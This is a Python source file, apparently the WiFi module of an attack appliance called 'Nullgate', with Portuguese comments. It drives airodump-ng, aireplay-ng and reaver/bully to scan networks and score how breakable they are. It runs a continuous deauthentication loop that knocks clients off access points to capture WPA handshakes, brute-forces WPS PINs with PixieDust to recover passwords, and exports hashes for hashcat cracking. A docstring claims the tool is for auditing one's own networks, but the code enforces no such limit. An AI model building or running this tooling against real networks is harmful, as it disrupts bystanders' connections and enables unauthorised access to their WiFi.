"""
Modulo WiFi do Nullgate: scan de redes, captura de handshake e export p/ hashcat.
Opera na interface de radio (adaptador USB, tipicamente wlan1), nunca na wlan0.

Auditoria das PROPRIAS redes. A UI exige confirmacao de autorizacao.
"""
import csv
import glob
import json
import os
import re
import signal
import subprocess
import time

DEFAULT_RADIO = os.environ.get("NULLGATE_RADIO", "wlan1")
WORK = "/tmp/nullgate/work"
DATA = "/opt/nullgate/data"
STORE = f"{DATA}/networks.json"
os.makedirs(WORK, exist_ok=True)
try:
    os.makedirs(DATA, exist_ok=True)
except OSError:
    DATA = WORK
    STORE = f"{DATA}/networks.json"
CAPTURES = f"{DATA}/captures"
try:
    os.makedirs(CAPTURES, exist_ok=True)
except OSError:
    CAPTURES = WORK

_capture = {"proc": None, "deauth": None, "started": 0, "targets": [], "iface": None,
            "essid": None, "mode": "ativo", "bssid": None, "ch": None}

_last_hs = {"ts": 0, "n": 0}


def _cap_file():
    files = glob.glob(f"{WORK}/cap-*.cap") + glob.glob(f"{WORK}/cap-*.pcap") + glob.glob(f"{WORK}/cap-*.pcapng")
    files.sort(key=lambda p: os.path.getmtime(p), reverse=True)
    return files[0] if files else None


def _slug(s):
    return re.sub(r"[^A-Za-z0-9_-]", "_", (s or "rede"))[:40]


def _sh(cmd, timeout=20):
    return subprocess.run(cmd, shell=True, capture_output=True, text=True,
                          errors="replace", timeout=timeout)


def _pick(iface):
    return iface or DEFAULT_RADIO


def _radio_present(iface):
    return os.path.exists(f"/sys/class/net/{iface}")


def _set_monitor(iface):
    _sh(f"ip link set {iface} down")
    _sh(f"iw dev {iface} set type monitor")
    _sh(f"ip link set {iface} up")
    time.sleep(1.5)
    info = _sh(f"iw dev {iface} info")
    return "type monitor" in (info.stdout or "")


def _set_managed(iface):
    _sh(f"ip link set {iface} down")
    _sh(f"iw dev {iface} set type managed")
    _sh(f"ip link set {iface} up")


def _cleanup_iface(iface):
    _sh("pkill -9 hcxdumptool 2>/dev/null; pkill -9 aireplay-ng 2>/dev/null; "
        "pkill -9 airodump-ng 2>/dev/null; pkill -9 wash 2>/dev/null", timeout=10)
    _capture["proc"] = None
    time.sleep(0.4)


def _usb_reset(iface):
    try:
        link = os.path.realpath(f"/sys/class/net/{iface}/device")
        node = os.path.basename(link).split(":")[0]
        auth = f"/sys/bus/usb/devices/{node}/authorized"
        if os.path.exists(auth):
            _sh(f"echo 0 > {auth}", timeout=8)
            time.sleep(3)
            _sh(f"echo 1 > {auth}", timeout=8)
            time.sleep(9)
            return True
    except Exception:
        pass
    return False


def reset_radio(iface=None):
    iface = _pick(iface)
    _sh("pkill -9 hcxdumptool 2>/dev/null; pkill -9 aireplay-ng 2>/dev/null; "
        "pkill -9 airodump-ng 2>/dev/null; pkill -9 wash 2>/dev/null", timeout=10)
    _capture["proc"] = None
    revived = _usb_reset(iface)
    time.sleep(1)
    if _radio_present(iface):
        _set_managed(iface)
    return {"ok": True, "usb_reset": revived,
            "msg": f"{iface} resetada" + (" + USB re-energizado" if revived else "")}


def _own_essid(essid):
    e = (essid or "").lower()
    return any(k in e for k in ["wr_", "wr ", "lk_", "iot", "supermerc", "wr-"])


def scan(seconds=12, iface=None, _retry=True):
    iface = _pick(iface)
    if not _radio_present(iface):
        return {"ok": False, "error": f"interface {iface} ausente."}
    _cleanup_iface(iface)
    for f in glob.glob(f"{WORK}/scan-*.csv"):
        try:
            os.remove(f)
        except OSError:
            pass
    if not _set_monitor(iface):
        return {"ok": False, "error": f"{iface} nao entrou em monitor mode"}
    try:
        _sh(
            f"timeout {seconds} airodump-ng {iface} --band bg "
            f"-w {WORK}/scan --output-format csv --write-interval 3 "
            f">/dev/null 2>&1",
            timeout=seconds + 10,
        )
    finally:
        _set_managed(iface)
    nets = _parse_scan()
    if not nets and _retry:
        _usb_reset(iface)
        return scan(seconds, iface, _retry=False)
    return {"ok": True, "iface": iface, "networks": nets, "recuperado": not _retry}


def _parse_scan():
    files = sorted(glob.glob(f"{WORK}/scan-*.csv"))
    if not files:
        return []
    nets = []
    with open(files[-1], errors="ignore") as fh:
        rows = list(csv.reader(fh))
    for r in rows:
        if not r or "Station MAC" in r[0]:
            if r and "Station MAC" in r[0]:
                break
            continue
        if ":" in r[0] and len(r) > 13:
            bssid = r[0].strip()
            try:
                ch = r[3].strip()
                pwr = r[8].strip()
                enc = r[5].strip()
                essid = r[13].strip()
            except IndexError:
                continue
            if not essid:
                continue
            nets.append({
                "bssid": bssid,
                "canal": ch,
                "sinal": pwr,
                "seguranca": enc,
                "essid": essid,
                "meu": _own_essid(essid),
            })

    agg = {}
    for n in nets:
        k = n["essid"]
        if k not in agg:
            agg[k] = {"essid": k, "meu": n["meu"], "aps": [], "canais": set(), "segs": set()}
        agg[k]["aps"].append({"bssid": n["bssid"], "canal": n["canal"],
                              "seguranca": n["seguranca"], "wpa3": _is_wpa3(n["seguranca"])})
        if n["canal"]:
            agg[k]["canais"].add(n["canal"])
        if n["seguranca"]:
            agg[k]["segs"].add(n["seguranca"])
    out = []
    for v in agg.values():
        v["canais"] = sorted(v["canais"])
        v["qtd_aps"] = len(v["aps"])
        segs = v.pop("segs")
        v["seguranca"] = " / ".join(sorted(segs)) if segs else "?"
        v["tem_wpa3"] = any(a["wpa3"] for a in v["aps"])
        v["bssids"] = [a["bssid"] for a in v["aps"]]
        out.append(v)
    out.sort(key=lambda x: (not x["meu"], x["essid"]))
    return out


def _is_wpa3(sec):
    s = (sec or "").upper()
    return "WPA3" in s or "SAE" in s


def _load_store():
    try:
        with open(STORE) as f:
            return json.load(f)
    except Exception:
        return {}


def _save_store(d):
    try:
        with open(STORE, "w") as f:
            json.dump(d, f, ensure_ascii=False, indent=1)
    except OSError:
        pass


def saved_networks():
    d = _load_store()
    out = list(d.values())
    out.sort(key=lambda x: x.get("ts", 0), reverse=True)
    return {"ok": True, "redes": out}


def forget_network(essid):
    d = _load_store()
    d.pop(essid, None)
    _save_store(d)
    return {"ok": True}


def _detect_vulns(enc, wps, clients, client_macs, essid, bssids):
    """Analisa o resultado do recon e devolve lista de vulns + score 0-10."""
    vulns = []
    auth = (enc.get("auth") or "").upper()
    privacy = (enc.get("privacy") or "").upper()
    cipher = (enc.get("cipher") or "").upper()

    if wps == "aberto":
        vulns.append({"tipo": "wps_aberto", "sev": "alta",
                      "detalhe": "WPS habilitado sem lock - PixieDust/PIN viavel"})
    elif wps == "travado":
        vulns.append({"tipo": "wps_travado", "sev": "media",
                      "detalhe": "WPS com lock - PIN brute lento, PixieDust pode funcionar"})

    sae_only = "SAE" in auth and "PSK" not in auth
    if sae_only:
        vulns.append({"tipo": "wpa3_sae_only", "sev": "info",
                      "detalhe": "WPA3 SAE puro - deauth bloqueado (PMF), precisa PMKID ou SAE crack"})
    elif "SAE" in auth and "PSK" in auth:
        vulns.append({"tipo": "wpa3_transition", "sev": "media",
                      "detalhe": "WPA3 transition (SAE+PSK) - deauth pode forcar downgrade pra PSK"})

    if "PSK" in auth and clients == 0:
        vulns.append({"tipo": "sem_cliente", "sev": "media",
                      "detalhe": "Nenhum cliente conectado - handshake so com PMKID ou esperar cliente"})

    rand_macs = []
    for m in client_macs:
        try:
            b = int(m.split(":")[1], 16)
            if b & 0x02:
                rand_macs.append(m)
        except Exception:
            pass
    if rand_macs:
        vulns.append({"tipo": "mac_aleatorio", "sev": "info",
                      "detalhe": f"{len(rand_macs)} cliente(s) com MAC aleatorio - deauth pode ser ignorado"})

    if not essid or essid.strip() == "":
        vulns.append({"tipo": "essid_oculto", "sev": "info",
                      "detalhe": "ESSID oculto - precisa capturar probe request pra descobrir"})

    if "TKIP" in cipher:
        vulns.append({"tipo": "tkip", "sev": "alta",
                      "detalhe": "TKIP (WPA1) - quebravel com ataques de dicionario/Beck-Tews"})
    if "WEP" in privacy:
        vulns.append({"tipo": "wep", "sev": "critica",
                      "detalhe": "WEP - quebra em minutos com aircrack-ng"})

    if "WEP" in privacy:
        score = 10
    elif wps == "aberto":
        score = 9
    elif "PSK" in auth and clients > 0:
        score = 8
    elif "PSK" in auth:
        score = 6
    elif "SAE" in auth and "PSK" in auth:
        score = 5
    elif sae_only:
        score = 1
    else:
        score = 3

    return vulns, score


def recon(essid, bssids, channels, iface=None):
    iface = _pick(iface)
    if not _radio_present(iface):
        return {"ok": False, "error": f"interface {iface} ausente."}
    chans = [str(c) for c in (channels or [])] or ["1", "6", "11"]
    _cleanup_iface(iface)
    for f in glob.glob(f"{WORK}/recon-*"):
        try:
            os.remove(f)
        except OSError:
            pass
    if not _set_monitor(iface):
        return {"ok": False, "error": f"{iface} nao entrou em monitor mode"}
    try:
        _sh(
            f"timeout 12 airodump-ng {iface} -c {','.join(chans)} "
            f"-w {WORK}/recon --output-format csv --write-interval 3 >/dev/null 2>&1",
            timeout=20,
        )
        enc, clients, client_macs = _parse_recon(bssids)
        wps = _wash(iface, chans[0], bssids)
    finally:
        _set_managed(iface)

    wpa3 = _is_wpa3(enc.get("privacy", "") + " " + enc.get("auth", ""))
    sae_only = "SAE" in enc.get("auth", "").upper() and "PSK" not in enc.get("auth", "").upper()
    vulns, score = _detect_vulns(enc, wps, clients, client_macs, essid, bssids)
    result = {
        "essid": essid,
        "bssids": bssids,
        "canais": chans,
        "seguranca": enc.get("privacy", "?"),
        "cifra": enc.get("cipher", "?"),
        "auth": enc.get("auth", "?"),
        "wps": wps,
        "clientes": clients,
        "clientes_macs": client_macs,
        "wpa3": wpa3,
        "deauth": "bloqueado" if sae_only else ("parcial" if wpa3 else "ok"),
        "captura_viavel": clients > 0 or enc.get("privacy", "").startswith("WPA"),
        "vulns": vulns,
        "score_quebra": score,
        "ts": int(time.time()),
    }
    store = _load_store()
    store[essid] = result
    _save_store(store)
    return {"ok": True, **result}


def _parse_recon(bssids):
    files = sorted(glob.glob(f"{WORK}/recon-*.csv"))
    enc = {}
    clients = 0
    client_macs = []
    targets = {b.lower() for b in bssids}
    if not files:
        return enc, clients, client_macs
    with open(files[-1], errors="replace") as fh:
        rows = list(csv.reader(fh))
    in_stations = False
    for r in rows:
        if r and "Station MAC" in r[0]:
            in_stations = True
            continue
        if not r or len(r) < 6:
            continue
        if not in_stations and ":" in r[0] and r[0].strip().lower() in targets:
            enc = {
                "privacy": r[5].strip(),
                "cipher": r[6].strip() if len(r) > 6 else "",
                "auth": r[7].strip() if len(r) > 7 else "",
            }
        elif in_stations and len(r) > 5 and r[5].strip().lower() in targets:
            clients += 1
            mac = r[0].strip().lower()
            if mac and mac not in client_macs:
                client_macs.append(mac)
    return enc, clients, client_macs


def _wash(iface, channel, bssids):
    if not _which("wash"):
        return "desconhecido"
    out = _sh(f"timeout 10 wash -i {iface} -c {channel} 2>/dev/null", timeout=16).stdout
    targets = {b.lower() for b in bssids}
    for line in out.splitlines():
        parts = line.split()
        if parts and ":" in parts[0] and parts[0].lower() in targets:
            low = line.lower()
            if " yes" in low:
                return "travado"
            return "aberto"
    return "nao"


def _which(prog):
    return subprocess.run(f"command -v {prog}", shell=True,
                          capture_output=True).returncode == 0


def capture_start(bssids, channels, iface=None, mode="ativo", essid=None, clients_macs=None):
    """mode: ativo = derruba clientes (deauth) e captura handshake;
             passivo = so escuta, sem enviar nada."""
    iface = _pick(iface)
    if not _radio_present(iface):
        return {"ok": False, "error": f"interface {iface} ausente."}
    if _capture["proc"] and _capture["proc"].poll() is None:
        return {"ok": False, "error": "captura ja em andamento"}
    if not bssids:
        return {"ok": False, "error": "nenhum BSSID alvo"}
    bssid = bssids[0]
    ch = str(channels[0]) if channels else "1"
    for f in glob.glob(f"{WORK}/cap-*"):
        try:
            os.remove(f)
        except OSError:
            pass
    _cleanup_iface(iface)
    if not _set_monitor(iface):
        return {"ok": False, "error": f"{iface} nao entrou em monitor mode"}
    # FOCA sempre em 1 BSSID + canal fixo. Handshake precisa do airodump parado
    # no canal do alvo pra pegar M1-M4 em sequencia; channel hopping nao pega.
    # Capturar o handshake de 1 AP do mesh ja serve (a senha e a mesma).
    _sh(f"iw dev {iface} set channel {ch} HT20", timeout=8)
    _last_hs.update(ts=0, n=0)
    _capture["saved"] = None
    # a TELA do airodump (tabelas ANSI que atualizam) ia pro airo.log e crescia
    # sem limite ate encher o /tmp (tmpfs/RAM de 208M) - ai nada mais gravava
    # (nem o .cap nem o .hc22000). Agora vai pro /dev/null. O CSV (pequeno, gira
    # com --write-interval) da os clientes conectados sem encher nada.
    airo = subprocess.Popen(
        ["airodump-ng", "-c", ch, "--bssid", bssid,
         "-w", f"{WORK}/cap", "--output-format", "pcap,csv",
         "--write-interval", "5", iface],
        stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL,
        preexec_fn=os.setsid,
    )
    deauth_proc = None
    if mode == "ativo":
        clients_macs = clients_macs or []
        dlog = f"{WORK}/deauth.log"
        if clients_macs:
            # direcionado aos clientes conhecidos (mais eficaz pra forcar handshake)
            inner = "; ".join(
                f"aireplay-ng --deauth 4 -a {bssid} -c {cm} {iface} >>{dlog} 2>&1"
                for cm in clients_macs)
        else:
            inner = f"aireplay-ng --deauth 4 -a {bssid} {iface} >>{dlog} 2>&1"
        # loop continuo e GENTIL: pulsos pequenos (4 frames) a cada 10s. Forca
        # reconexao sem bombardear (deauth agressivo faz o AP renovar o ANONCE
        # e estraga o handshake).
        deauth_proc = subprocess.Popen(
            ["bash", "-c", f"sleep 4; while true; do {inner}; sleep 10; done"],
            preexec_fn=os.setsid,
        )
    _capture.update({"proc": airo, "deauth": deauth_proc, "started": time.time(),
                     "targets": bssids, "iface": iface, "essid": essid,
                     "mode": mode, "bssid": bssid, "ch": ch})
    return {"ok": True, "msg": "captura iniciada", "iface": iface, "modo": mode,
            "alvo": bssid, "canal": ch, "deauth_direcionado": bool(clients_macs)}

def deauth(bssid, channel, iface=None, seconds=10):
    """Derruba os clientes de um AP (forca reconexao). So em redes suas."""
    iface = _pick(iface)
    if not _radio_present(iface):
        return {"ok": False, "error": f"interface {iface} ausente."}
    if _capture["proc"] and _capture["proc"].poll() is None:
        return {"ok": False, "error": "pare a captura antes (mesma placa)"}
    if not _set_monitor(iface):
        return {"ok": False, "error": f"{iface} nao entrou em monitor mode"}
    try:
        if channel:
            _sh(f"iw dev {iface} set channel {channel} HT20", timeout=8)
        r = _sh(f"timeout {seconds} aireplay-ng --deauth 0 -a {bssid} {iface}",
                timeout=seconds + 8)
    finally:
        _set_managed(iface)
    sent = r.stdout.count("Sending") + r.stdout.count("DeAuth")
    return {"ok": True, "bssid": bssid, "pacotes": sent, "saida": r.stdout[-400:]}


def _persist(src, label):
    """Copia um arquivo de captura/hash para a pasta persistente."""
    if not os.path.exists(src) or os.path.getsize(src) == 0:
        return None
    ext = os.path.splitext(src)[1]
    name = f"{_slug(label)}_{int(time.time())}{ext}"
    dst = f"{CAPTURES}/{name}"
    try:
        import shutil
        shutil.copy(src, dst)
        return name
    except Exception:
        return None


def list_files():
    out = []
    for p in sorted(glob.glob(f"{CAPTURES}/*")):
        try:
            st = os.stat(p)
            out.append({"nome": os.path.basename(p), "bytes": st.st_size,
                        "ts": int(st.st_mtime),
                        "tipo": "handshake" if p.endswith(".hc22000") else
                                "captura" if p.endswith(".pcapng") else "arquivo"})
        except OSError:
            pass
    out.sort(key=lambda x: x["ts"], reverse=True)
    return {"ok": True, "files": out, "pasta": CAPTURES}


def delete_file(name):
    p = f"{CAPTURES}/{os.path.basename(name or "")}"
    if os.path.exists(p):
        os.remove(p)
    return {"ok": True}


def _autosave_on_hs():
    """Se ha handshake na captura atual, para tudo e persiste pcap + hc22000."""
    if _capture.get("saved"):
        return _capture["saved"]
    cap = _cap_file()
    if not cap or not os.path.exists(cap):
        return None
    hs = _count_handshakes(cap, force=True)
    if hs <= 0:
        return None
    _kill_proc(_capture.get("deauth"))
    _kill_proc(_capture.get("proc"))
    _capture["deauth"] = None
    iface = _capture.get("iface") or DEFAULT_RADIO
    _cleanup_iface(iface)
    _set_managed(iface)
    label = _capture.get("essid") or "rede"
    saved = {"handshakes": hs, "pcap": _persist(cap, label), "hc22000": None}
    out = f"{WORK}/nullgate.hc22000"
    try:
        os.remove(out)
    except OSError:
        pass
    _sh(f"hcxpcapngtool -o {out} {cap}", timeout=60)
    if os.path.exists(out) and os.path.getsize(out) > 0:
        saved["hc22000"] = _persist(out, label)
    _capture["saved"] = saved
    return saved


def _capture_log(size, handshakes, elapsed):
    """Log REAL da captura (nao animacao): le o CSV do airodump (AP alvo +
    clientes conectados) e o deauth.log, e monta linhas legiveis do que esta
    de fato acontecendo."""
    linhas = []
    tgt = (_capture.get("bssid") or "").lower()
    ch = _capture.get("ch") or "?"
    linhas.append(f"[{elapsed}s] monitor em {_capture.get('iface')} · canal {ch}")
    linhas.append(f"alvo {_capture.get('bssid')} ({_capture.get('essid') or '?'})")
    beacons = None
    clientes = []
    try:
        csvs = sorted(glob.glob(f"{WORK}/cap-*.csv"))
        if csvs:
            with open(csvs[-1], errors="replace") as fh:
                rows = list(csv.reader(fh))
            in_st = False
            for r in rows:
                if r and "Station MAC" in r[0]:
                    in_st = True
                    continue
                if not r or len(r) < 5:
                    continue
                if not in_st and ":" in r[0] and r[0].strip().lower() == tgt:
                    beacons = r[9].strip() if len(r) > 9 else None
                elif in_st and ":" in r[0]:
                    assoc = r[5].strip().lower() if len(r) > 5 else ""
                    if assoc == tgt:
                        pk = r[4].strip() if len(r) > 4 else "?"
                        clientes.append((r[0].strip(), pk))
    except Exception:
        pass
    if beacons is not None:
        linhas.append(f"AP visto · {beacons} beacons recebidos")
    else:
        linhas.append("AP ainda nao visto (sinal fraco? canal certo?)")
    if clientes:
        linhas.append(f"{len(clientes)} cliente(s) conectado(s):")
        for mac, pk in clientes[:4]:
            linhas.append(f"  • {mac} · {pk} pacotes")
    else:
        linhas.append("nenhum cliente conectado (sem cliente, sem handshake)")
    # deauth real
    dlog = f"{WORK}/deauth.log"
    try:
        if os.path.exists(dlog):
            dl = [l.strip() for l in open(dlog, errors="replace") if "ACK" in l or "Sending" in l or "DeAuth" in l]
            if dl:
                linhas.append("deauth » " + dl[-1][:58])
    except Exception:
        pass
    linhas.append(f"capturado: {size/1024:.1f} KB")
    if handshakes > 0:
        linhas.append(f"✅ HANDSHAKE capturado ({handshakes}) — pronto pra exportar")
    else:
        linhas.append("handshake: aguardando um cliente (re)conectar…")
    return linhas


def capture_status():
    proc = _capture["proc"]
    running = bool(proc and proc.poll() is None)
    elapsed = int(time.time() - _capture["started"]) if _capture["started"] else 0
    cap = _cap_file()
    size = os.path.getsize(cap) if cap and os.path.exists(cap) else 0
    handshakes = _count_handshakes(cap) if cap and size > 0 else 0
    saved = None
    if handshakes > 0 and not _capture.get("saved"):
        saved = _autosave_on_hs()
        running = False
    return {
        "ok": True,
        "rodando": running,
        "segundos": elapsed,
        "bytes": size,
        "handshakes": handshakes,
        "alvos": _capture["targets"],
        "salvo": _capture.get("saved"),
        "log": _capture_log(size, handshakes, elapsed),
    }


def _count_handshakes(cap, force=False):
    """Conta handshakes QUEBRAVEIS: so os que o hcxpcapngtool converte pra
    hc22000 (EAPOL pair valido ou PMKID). Evita falso positivo do aircrack,
    que lista 'WPA (0 handshake)' pra toda rede WPA. 'Pegou' = da pra quebrar."""
    now = time.time()
    if not force and now - _last_hs["ts"] < 8:
        return _last_hs["n"]
    n = 0
    tmp = f"{WORK}/_probe.hc22000"
    try:
        os.remove(tmp)
    except OSError:
        pass
    _sh(f"hcxpcapngtool -o {tmp} {cap} 2>/dev/null", timeout=30)
    if os.path.exists(tmp) and os.path.getsize(tmp) > 0:
        with open(tmp) as f:
            n = sum(1 for ln in f if ln.strip())
    _last_hs.update(ts=now, n=n)
    return n


def _kill_proc(p):
    if p and p.poll() is None:
        try:
            os.killpg(os.getpgid(p.pid), signal.SIGTERM)
            for _ in range(8):
                if p.poll() is not None:
                    break
                time.sleep(0.2)
            if p.poll() is None:
                os.killpg(os.getpgid(p.pid), signal.SIGKILL)
        except Exception:
            try:
                p.kill()
            except Exception:
                pass

# ---------------- WPS attack (reaver PixieDust + PIN + bully) ----------------
_wps = {"proc": None, "log": f"{WORK}/wps.log", "bssid": None, "iface": None,
        "fase": None, "ch": None, "essid": None, "parar": False, "msg": None}

# timeouts curtos: WPS em campo resolve rapido (pixie) ou nao resolve. PIN brute
# completo e inviavel (AP trava), entao a deteccao de lock aborta antes do limite.
_WPS_LIMITE = {"pixie": 150, "pin": 180, "bully": 180}


def _wps_log_tail(n=40):
    try:
        with open(_wps["log"], errors="replace") as f:
            return "".join(f.readlines()[-n:])
    except OSError:
        return ""


def _wps_parse():
    import re
    txt = _wps_log_tail(400)
    pin = psk = None
    m = re.search(r"(?:WPS PIN|Pin found|PIN)\s*[:=]\s*['\"]?(\d{4,8})", txt, re.I)
    if m:
        pin = m.group(1)
    m = re.search(r"(?:WPA PSK|PSK|Password)\s*[:=]\s*['\"]?([^\s'\"]+)", txt, re.I)
    if m:
        psk = m.group(1)
    done = bool(pin or psk) or ("WPS PIN:" in txt) or ("WPA PSK:" in txt)
    return pin, psk, done


def _wps_locked(txt):
    """AP travou o WPS (rate limiting / lock) - nao adianta insistir nessa fase."""
    low = txt.lower()
    return ("rate limiting" in low or "wps lock" in low
            or "ap is locked" in low or "detected ap rate" in low)


def _wps_cmd(iface, bssid, ch, fase):
    c = ("-c %d " % int(ch)) if ch else ""
    if fase == "pixie":
        return ("reaver -i %s -b %s %s-K 1 -N -vvv -d 1 -T 5 -r 3:15 -l 60 -S"
                % (iface, bssid, c))
    if fase == "pin":
        return ("reaver -i %s -b %s %s-vvv -d 1 -T 5 -r 3:15 -l 60 -S -N"
                % (iface, bssid, c))
    if fase == "bully":
        return ("bully %s -b %s %s-d -v 3 -S -F -B" % (iface, bssid, c))
    return None


def _wps_run_fase(fase):
    if fase == "bully" and not _which("bully"):
        with open(_wps["log"], "a", errors="replace") as f:
            f.write("\n[fase bully pulada: bully nao instalado]\n")
        return False
    cmd = _wps_cmd(_wps["iface"], _wps["bssid"], _wps["ch"], fase)
    if not cmd:
        return False
    _wps["fase"] = fase
    with open(_wps["log"], "a", errors="replace") as f:
        f.write("\n=== fase: %s ===\n" % fase)
    _wps["proc"] = subprocess.Popen(cmd + " >> %s 2>&1" % _wps["log"],
                                    shell=True, preexec_fn=os.setsid)
    limite = _WPS_LIMITE.get(fase, 180)
    t0 = time.time()
    while _wps["proc"].poll() is None:
        if _wps["parar"] or time.time() - t0 > limite:
            _kill_proc(_wps["proc"])
            break
        pin, psk, done = _wps_parse()
        if done:
            _kill_proc(_wps["proc"])
            return True
        if _wps_locked(_wps_log_tail(80)):
            _kill_proc(_wps["proc"])
            with open(_wps["log"], "a", errors="replace") as f:
                f.write("\n[-] AP travou o WPS (rate limiting/lock) - abortando fase %s\n" % fase)
            _wps["msg"] = "AP travou o WPS (lock/rate limiting)"
            break
        time.sleep(2)
    pin, psk, done = _wps_parse()
    return done


def _wps_orquestra():
    for fase in ("pixie", "pin", "bully"):
        if _wps["parar"]:
            break
        if _wps_run_fase(fase):
            return
    if not _wps["parar"]:
        with open(_wps["log"], "a", errors="replace") as f:
            f.write("\n[-] todas as fases terminaram sem achar o PIN/PSK\n")


def wps_attack_start(bssid, channel, iface=None, essid=None):
    if not _which("reaver"):
        return {"ok": False, "error": "reaver nao instalado (apt install reaver)"}
    if not bssid:
        return {"ok": False, "error": "bssid obrigatorio"}
    if _wps["proc"] and _wps["proc"].poll() is None:
        return {"ok": False, "error": "ataque WPS ja rodando"}
    iface = iface or DEFAULT_RADIO
    try:
        os.remove(_wps["log"])
    except OSError:
        pass
    _set_monitor(iface)
    _wps.update({"bssid": bssid, "iface": iface, "ch": channel, "essid": essid,
                 "fase": "pixie", "parar": False, "msg": None})
    import threading
    t = threading.Thread(target=_wps_orquestra, daemon=True)
    t.start()
    fases = "PixieDust -> PIN" + (" -> bully" if _which("bully") else "")
    return {"ok": True, "msg": "ataque WPS iniciado (%s)" % fases,
            "bssid": bssid, "iface": iface}


def wps_attack_status():
    running = bool(_wps["proc"] and _wps["proc"].poll() is None)
    pin, psk, done = _wps_parse()
    return {"ok": True, "rodando": running, "pin": pin, "psk": psk,
            "sucesso": done, "bssid": _wps["bssid"], "fase": _wps["fase"],
            "aviso": _wps.get("msg"), "log": _wps_log_tail(30)}


def wps_attack_stop():
    _wps["parar"] = True
    _kill_proc(_wps["proc"])
    _wps["proc"] = None
    _wps["fase"] = None
    iface = _wps["iface"] or DEFAULT_RADIO
    _cleanup_iface(iface)
    _set_managed(iface)
    pin, psk, done = _wps_parse()
    return {"ok": True, "msg": "ataque WPS parado", "pin": pin, "psk": psk, "sucesso": done}

def capture_stop():
    _kill_proc(_capture.get("deauth"))
    _kill_proc(_capture.get("proc"))
    _capture["deauth"] = None
    iface = _capture.get("iface") or DEFAULT_RADIO
    _cleanup_iface(iface)
    _set_managed(iface)
    cap = _cap_file()
    hs = _count_handshakes(cap, force=True) if cap else 0
    saved = _capture.get("saved")
    if hs > 0 and not saved:
        saved = _autosave_on_hs()
    return {"ok": True, "msg": "captura parada", "handshakes": hs,
            "iface": iface, "salvo": saved}


def export_hc22000():
    cap = _cap_file()
    out = f"{WORK}/nullgate.hc22000"
    if not cap or not os.path.exists(cap):
        return {"ok": False, "error": "nada capturado ainda"}
    try:
        os.remove(out)
    except OSError:
        pass
    _sh(f"hcxpcapngtool -o {out} {cap}", timeout=60)
    if not os.path.exists(out) or os.path.getsize(out) == 0:
        return {"ok": False, "error": "nenhum handshake valido pra exportar"}
    with open(out) as f:
        content = f.read()
    label = _capture.get("essid") or "rede"
    saved_hash = _persist(out, label)
    _persist(cap, label)
    return {
        "ok": True,
        "arquivo": "nullgate.hc22000",
        "salvo_como": saved_hash,
        "linhas": content.count("\n"),
        "conteudo": content,
        "dica": "rode na GPU: hashcat -m 22000 nullgate.hc22000 wordlist.txt",
    }
